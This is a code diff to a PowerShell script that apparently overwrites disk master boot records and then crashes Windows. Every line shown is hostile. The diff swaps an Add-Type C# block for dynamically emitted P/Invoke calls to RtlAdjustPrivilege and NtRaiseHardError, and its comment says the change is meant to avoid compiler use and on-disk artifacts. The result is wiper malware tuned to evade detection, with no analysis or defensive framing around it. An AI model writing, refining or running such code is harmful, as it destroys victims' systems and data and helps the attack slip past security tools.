@@ -47,34 +47,25 @@ foreach ($drive in $drives) {
     }
 }
 
-# Only execute Add-Type if at least one MBR was modified
+# Replaced Add-Type with dynamic signatures to eliminate the need for calling CSC and avoid on-disk artifacts
 if ($mbrOverwritten) {
 
-$src = @"
-using System;
-using System.Runtime.InteropServices;
+    $asmName = New-Object Reflection.AssemblyName "DInvoke"
+    $asm = [AppDomain]::CurrentDomain.DefineDynamicAssembly($asmName, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $mod = $asm.DefineDynamicModule("DynamicModule", $false)
+    $type = $mod.DefineType("NativeMethods")
 
-public static class Program {
-
-    [DllImport("ntdll")]
-    private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
-
-    [DllImport("ntdll")]
-    private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
-
-    public static void Main() {
-
-        bool PreviousValue; 
-	uint Response;
-        RtlAdjustPrivilege(19, true, false, out PreviousValue);
-        NtRaiseHardError(0xC0000022, 0, 0, IntPtr.Zero, 6, out Response);
-
+    function Add-DInvoke {
+        param($DllName, $Name, $ParameterTypes, $ReturnType)
+        $mb = $type.DefinePInvokeMethod($Name, $DllName, 'Public,Static,PinvokeImpl', 'Standard', $ReturnType, $ParameterTypes, 'Winapi', 'Auto')
+        $mb.SetImplementationFlags('PreserveSig')
     }
-}
-"@
 
-Add-Type $src
+    Add-DInvoke -DllName "ntdll" -Name "RtlAdjustPrivilege" -ParameterTypes @([Int32], [Boolean], [Boolean], ([Boolean]).MakeByRefType()) -ReturnType ([Void]) | Out-Null
+    Add-DInvoke -DllName "ntdll" -Name "NtRaiseHardError" -ParameterTypes @([UInt32], [UInt32], [UInt32], [IntPtr], [UInt32], ([UInt32]).MakeByRefType()) -ReturnType ([Void]) | Out-Null
 
-[Program]::Main()
+    $NM = $type.CreateType()
+    $NM::RtlAdjustPrivilege(19, $true, $false, [ref]0)
+    $NM::NtRaiseHardError(3221225506, 0, 0, [IntPtr]::Zero, 6, [ref]0)
 
 }
